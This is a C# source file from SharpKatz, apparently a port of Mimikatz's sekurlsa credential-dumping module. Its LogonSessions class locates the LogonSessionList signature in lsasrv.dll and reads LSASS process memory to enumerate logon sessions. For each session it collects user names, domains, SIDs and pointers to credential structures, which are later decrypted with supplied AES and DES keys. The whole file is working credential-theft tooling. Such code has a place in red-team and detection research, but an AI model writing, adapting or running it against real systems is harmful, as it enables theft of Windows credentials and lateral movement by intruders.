using SharpKatz.Credential;
using SharpKatz.Crypto;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;

namespace SharpKatz.Module
{
    class LogonSessions
    {

        static long max_search_size = 580000;

        static string[] KUHL_M_SEKURLSA_LOGON_TYPE = {
            "UndefinedLogonType",
            "Unknown !",
            "Interactive",
            "Network",
            "Batch",
            "Service",
            "Proxy",
            "Unlock",
            "NetworkCleartext",
            "NewCredentials",
            "RemoteInteractive",
            "CachedInteractive",
            "CachedRemoteInteractive",
            "CachedUnlock"
        };

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_BASIC_SECURITY_LOGON_SESSION_DATA
        {
            //PKUHL_M_SEKURLSA_CONTEXT	cLsass;
            //const KUHL_M_SEKURLSA_LOCAL_HELPER * lsassLocalHelper;
            public IntPtr LogonId; //PLUID
            public string UserName; //PNatives.UNICODE_STRING
            public string LogonDomain; //PNatives.UNICODE_STRING
            public int LogonType;
            public int Session;
            public IntPtr pCredentials;
            public IntPtr pSid; //PSID
            public IntPtr pCredentialManager;
            public FILETIME LogonTime;
            public string LogonServer; //PNatives.UNICODE_STRING
        }

        public static unsafe int FindCredentials(IntPtr hLsass, IntPtr lsasrvMem, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
        {

            uint logonSessionListSignOffset, logonSessionListOffset, logonSessionListCountOffset;
            IntPtr logonSessionListAddr;
            int logonSessionListCount; //*DWORD

            // Load lsasrv.dll locally to avoid multiple ReadProcessMemory calls into lsass
            IntPtr lsasrvLocal = Natives.LoadLibrary("lsasrv.dll");
            if (lsasrvLocal == IntPtr.Zero)
            {
                Console.WriteLine("[x] Error: Could not load lsasrv.dll locally");
                return 1;
            }
            //Console.WriteLine("[*] Loaded lsasrv.dll locally at address {0:X}", lsasrvLocal.ToInt64());

            byte[] tmpbytes = new byte[max_search_size];
            Marshal.Copy(lsasrvLocal, tmpbytes, 0, (int)max_search_size);

            // Search for LogonSessionList signature within lsasrv.dll and grab the offset
            logonSessionListSignOffset = (uint)Utility.SearchPattern(tmpbytes, oshelper.logonSessionListSign);
            if (logonSessionListSignOffset == 0)
            {
                Console.WriteLine("[x] Error: Could not find LogonSessionList signature\n");
                return 1;
            }
            //Console.WriteLine("[*] LogonSessionList offset found as {0}", logonSessionListSignOffset);

            // Read memory offset to LogonSessionList from a "lea param-1, [LogonSessionList]" asm
            IntPtr tmp_p = IntPtr.Add(lsasrvMem, (int)logonSessionListSignOffset + oshelper.LOGONSESSIONLISTOFFSET);
            byte[] logonSessionListOffsetBytes = Utility.ReadFromLsass(ref hLsass, tmp_p, sizeof(uint));
            logonSessionListOffset = BitConverter.ToUInt32(logonSessionListOffsetBytes, 0);

            // Read memory offset to LogonSessionListCount from a "mov R8D,dword ptr [LogonSessionListCount]" asm
            tmp_p = IntPtr.Add(lsasrvMem, (int)logonSessionListSignOffset + oshelper.LOGONSESSIONSLISTCOUNTOFFSET);
            byte[] logonSessionListCountOffsetBytes = Utility.ReadFromLsass(ref hLsass, tmp_p, sizeof(uint));
            logonSessionListCountOffset = BitConverter.ToUInt32(logonSessionListCountOffsetBytes, 0);

            // Read pointer at address to get the true memory location of LogonSessionList
            tmp_p = IntPtr.Add(lsasrvMem, (int)logonSessionListSignOffset + oshelper.LOGONSESSIONLISTOFFSET + sizeof(int) + (int)logonSessionListOffset);
            byte[] logonSessionListAddrBytes = Utility.ReadFromLsass(ref hLsass, tmp_p, 8);
            logonSessionListAddr = new IntPtr(BitConverter.ToInt64(logonSessionListAddrBytes, 0));
            Int64 logonSessionListAddrInt = BitConverter.ToInt64(logonSessionListAddrBytes, 0);

            // Read pointer at address to get the true memory location of LogonSessionListCount
            tmp_p = IntPtr.Add(lsasrvMem, (int)logonSessionListSignOffset + (int)logonSessionListCountOffset);
            byte[] logonSessionListCountBytes = Utility.ReadFromLsass(ref hLsass, tmp_p, 8);
            logonSessionListCount = BitConverter.ToInt32(logonSessionListCountBytes, 0);

            //Console.WriteLine("[*] LogSessList found at address {0:X}", logonSessionListAddr.ToInt64());
            //Console.WriteLine("[*] LogSessListCount {0}", logonSessionListCount);

            Type ListType = oshelper.ListType;
            Type ex = typeof(Utility);
            MethodInfo mi = ex.GetMethod("ReadStruct");
            MethodInfo miConstructed = mi.MakeGenericMethod(ListType);

            IntPtr pList = logonSessionListAddr;

            do
            {
                byte[] listentryBytes = Utility.ReadFromLsass(ref hLsass, pList, Convert.ToUInt64(oshelper.ListTypeSize));

                GCHandle pinnedArray = GCHandle.Alloc(listentryBytes, GCHandleType.Pinned);
                IntPtr listentry = pinnedArray.AddrOfPinnedObject();

                KIWI_BASIC_SECURITY_LOGON_SESSION_DATA logonsession = new KIWI_BASIC_SECURITY_LOGON_SESSION_DATA
                {
                    LogonId = IntPtr.Add(listentry, oshelper.LocallyUniqueIdentifierOffset),
                    LogonType = Marshal.ReadInt32(IntPtr.Add(listentry, oshelper.LogonTypeOffset)),//slistentry.LogonType,
                    Session = Marshal.ReadInt32(IntPtr.Add(listentry, oshelper.SessionOffset)),//slistentry.Session
                    pCredentials = new IntPtr(Marshal.ReadInt64(IntPtr.Add(listentry, oshelper.CredentialsOffset))),//slistentry.Credentials,
                    pCredentialManager = new IntPtr(Marshal.ReadInt64(IntPtr.Add(listentry, oshelper.CredentialManagerOffset))),
                    pSid = IntPtr.Add(listentry, oshelper.pSidOffset)
                };
                FILETIME logontime = Utility.ReadStructFromLocalPtr<FILETIME>(IntPtr.Add(listentry, oshelper.LogonTimeOffset));
                logonsession.LogonTime = logontime;

                Natives.LUID luid = Utility.ReadStructFromLocalPtr<Natives.LUID>(logonsession.LogonId);

                IntPtr pUserName = IntPtr.Add(pList, oshelper.UserNameListOffset);
                IntPtr pLogonDomain = IntPtr.Add(pList, oshelper.DomaineOffset);
                IntPtr pLogonServer = IntPtr.Add(pList, oshelper.LogonServerOffset);

                logonsession.UserName = Utility.ExtractUnicodeStringString(hLsass, Utility.ExtractUnicodeString(hLsass, pUserName));
                logonsession.LogonDomain = Utility.ExtractUnicodeStringString(hLsass, Utility.ExtractUnicodeString(hLsass, pLogonDomain));
                logonsession.LogonServer = Utility.ExtractUnicodeStringString(hLsass, Utility.ExtractUnicodeString(hLsass, pLogonServer));

                string stringSid;
                Natives.ConvertSidToStringSid(Utility.ExtractSid(hLsass, logonsession.pSid), out stringSid);

                Logon logon = new Logon(luid)
                {
                    Session = logonsession.Session,
                    LogonType = KUHL_M_SEKURLSA_LOGON_TYPE[logonsession.LogonType],
                    LogonTime = logonsession.LogonTime,
                    UserName = logonsession.UserName,
                    LogonDomain = logonsession.LogonDomain,
                    LogonServer = logonsession.LogonServer,
                    SID = stringSid,
                    pCredentials = logonsession.pCredentials,
                    pCredentialManager = logonsession.pCredentialManager
                };
                logonlist.Add(logon);

                pList = new IntPtr(Marshal.ReadInt64(listentry));

                pinnedArray.Free();
            } while (pList != logonSessionListAddr);

            return 0;
        }
    }
}
